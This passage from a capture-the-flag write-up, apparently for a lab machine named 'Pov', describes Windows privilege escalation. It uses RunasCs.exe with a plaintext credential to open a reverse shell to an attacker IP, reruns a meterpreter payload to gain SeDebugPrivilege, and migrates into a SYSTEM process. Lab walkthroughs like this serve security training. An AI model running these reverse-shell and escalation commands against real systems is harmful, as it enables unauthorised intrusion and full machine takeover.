.\rev.exe
```

Now we have a meterpreter shell. However, when we execute getprivs, we do not see SeDebugPrivilege. This could be because we initiated the meterpreter shell from a Invoke-Command, which might apply some restrictions. To bypass that, let’s use RunasCs.exe: https://github.com/antonioCoco/RunasCs/releases

We transfer the executable to sfitz’s session, then execute the following to get a shell without restrictions:

```bash
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.16.3:4444
```

Now, execute our meterpreter payload again, we now have SeDebugPrivilege on our meterpreter shell:

![image.png]({{ site.baseurl }}/assets/pov/image%2015.png)

Now, let’s migrate to a NT SYSTEM process. We can choose processes such as vmwaretools or winlogon:

```bash
ps

 2256  624   vmtoolsd.  x64   0                      C:\Program Files                                                                          
             exe                                     \VMware\VMware T                                                                          
                                                     ools\vmtoolsd.ex     
```

```bash
migrate 2256
```

Now let’s go into a shell:

```bash
shell
```

![image.png]({{ site.baseurl }}/assets/pov/image%2016.png)

We are now SYSTEM.